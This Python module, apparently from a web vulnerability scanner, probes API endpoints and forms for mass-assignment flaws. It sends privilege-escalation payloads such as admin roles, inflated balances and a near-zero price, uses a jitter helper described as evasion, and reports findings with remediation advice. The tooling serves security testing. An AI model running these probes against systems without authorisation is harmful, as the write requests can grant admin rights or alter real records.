"""
modules/vulns/mass_assignment.py — Mass Assignment / Parameter Pollution

Sends extra privilege-escalation fields in API requests and form posts.
If injected fields appear in the response with our values, it's vulnerable.
"""
import asyncio
import json
import logging
import re
from urllib.parse import urlparse
from core.finding import Finding
from core.http_client import make_client, PROBE_TIMEOUT
from core.evasion import maybe_jitter

logger = logging.getLogger(__name__)

# Fields that escalate privileges if accepted by the server
PRIV_FIELDS: list[dict] = [
    {"role": "admin"},
    {"role": "administrator"},
    {"isAdmin": True},
    {"is_admin": True},
    {"admin": True},
    {"user_type": "admin"},
    {"privilege": "superuser"},
    {"permissions": ["admin", "write", "read", "delete"]},
    {"access_level": 9999},
    {"verified": True},
    {"email_verified": True},
    {"approved": True},
    {"banned": False},
    {"is_staff": True},
    {"is_superuser": True},
    {"group": "admin"},
    {"groups": ["admin"]},
    {"scope": "admin:all"},
    {"credits": 999999},
    {"balance": 999999},
    {"price": 0.01},
    {"discount": 100},
    {"subscription": "premium"},
    {"plan": "enterprise"},
    {"active": True},
    {"confirmed": True},
]

# API endpoint patterns
API_PATTERNS = re.compile(
    r'/api/|/v\d+/|/rest/|/graphql|/json|\.json$|/user|/account|/profile|/register|/signup',
    re.IGNORECASE
)

# HTTP methods that accept body
BODY_METHODS = {"POST", "PUT", "PATCH"}


class MassAssignment:
    async def run(self, ctx: dict) -> list[Finding]:
        findings: list[Finding] = []
        endpoints = ctx.get("endpoints", [])
        forms     = ctx.get("forms", [])
        limiter   = ctx["limiter"]
        sem       = asyncio.Semaphore(6)
        seen: set[str] = set()

        # ── API endpoint testing ──────────────────────────────────────────────
        api_endpoints = [ep for ep in endpoints if API_PATTERNS.search(ep)]

        async def probe_api(ep: str):
            if ep in seen:
                return
            seen.add(ep)
            f = await self._probe_api(ep, limiter, sem)
            if f:
                findings.append(f)

        # ── Form testing ──────────────────────────────────────────────────────
        async def probe_form(form: dict):
            action = form.get("action", "")
            method = form.get("method", "GET").upper()
            if method not in BODY_METHODS:
                return
            key = f"form:{action}"
            if key in seen:
                return
            seen.add(key)
            f = await self._probe_form(form, limiter, sem)
            if f:
                findings.append(f)

        await asyncio.gather(
            *[probe_api(ep) for ep in api_endpoints[:50]],
            *[probe_form(f) for f in forms[:30]],
        )
        logger.info(f"MassAssignment completed — {len(findings)} finding(s)")
        return findings

    async def _probe_api(self, url: str, limiter, sem) -> Finding | None:
        async with sem:
            # First: make a baseline GET to see normal response
            try:
                await maybe_jitter()
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as c:
                        baseline = await c.get(url)
                baseline_json = {}
                try:
                    baseline_json = baseline.json()
                except Exception:
                    if "application/json" not in baseline.headers.get("content-type", ""):
                        return None  # Not a JSON API

                # Now try POST/PUT with privilege escalation fields
                for extra_fields in PRIV_FIELDS[:8]:
                    payload = {**extra_fields, "email": "test@test.com",
                               "username": "testuser", "password": "Test123!"}
                    for method in ["POST", "PUT", "PATCH"]:
                        try:
                            async with limiter.acquire():
                                async with make_client(timeout=PROBE_TIMEOUT) as c:
                                    if method == "POST":
                                        r = await c.post(url, json=payload)
                                    elif method == "PUT":
                                        r = await c.put(url, json=payload)
                                    else:
                                        r = await c.patch(url, json=payload)

                            if r.status_code not in (200, 201, 202):
                                continue

                            resp_text = r.text.lower()
                            # Check if our injected field values appear in response
                            for field, value in extra_fields.items():
                                val_str = str(value).lower()
                                if val_str in resp_text and field.lower() in resp_text:
                                    return Finding(
                                        title=f"Mass Assignment: '{field}' accepted at {url}",
                                        severity="High",
                                        description=(
                                            f"API endpoint {url} accepts '{field}': {value} in {method} request. "
                                            f"The field appeared in the response, indicating mass assignment vulnerability."
                                        ),
                                        affected_url=url,
                                        proof=f"{method} {url}\nPayload: {json.dumps(extra_fields)}\nField '{field}' reflected in response",
                                        remediation="Use explicit allow-lists for accepted fields. Never bind request bodies directly to model objects.",
                                        impact=4, likelihood=3, module="MassAssignment",
                                        references=["https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"],
                                        cvss_score=7.5, cwe="CWE-915",
                                    )
                        except Exception as e:
                            logger.debug(f"MassAssignment API {method} {url}: {e}")
            except Exception as e:
                logger.debug(f"MassAssignment baseline {url}: {e}")
        return None

    async def _probe_form(self, form: dict, limiter, sem) -> Finding | None:
        action = form.get("action", "")
        method = form.get("method", "GET").upper()
        inputs = form.get("inputs", [])
        async with sem:
            # Baseline
            try:
                base_data = {i: "test" for i in inputs}
                async with limiter.acquire():
                    async with make_client(timeout=PROBE_TIMEOUT) as c:
                        br = await (c.post(action, data=base_data) if method == "POST"
                                    else c.get(action, params=base_data))
                baseline_text = br.text
            except Exception:
                return None

            for extra_fields in PRIV_FIELDS[:5]:
                data = {i: "test" for i in inputs}
                data.update({k: str(v) for k, v in extra_fields.items()})
                try:
                    await maybe_jitter()
                    async with limiter.acquire():
                        async with make_client(timeout=PROBE_TIMEOUT) as c:
                            r = await (c.post(action, data=data) if method == "POST"
                                       else c.get(action, params=data))
                    for field, value in extra_fields.items():
                        val_str = str(value).lower()
                        if val_str in r.text.lower() and val_str not in baseline_text.lower():
                            return Finding(
                                title=f"Mass Assignment via Form: '{field}' accepted at {action}",
                                severity="High",
                                description=f"Form at {action} accepts extra field '{field}': {value}.",
                                affected_url=action,
                                proof=f"{method} {action}\nExtra field: {field}={value}\nValue reflected in response",
                                remediation="Use strict allow-lists for form fields. Ignore unexpected parameters.",
                                impact=4, likelihood=3, module="MassAssignment",
                                cvss_score=7.5, cwe="CWE-915",
                            )
                except Exception as e:
                    logger.debug(f"MassAssignment form {action}: {e}")
        return None
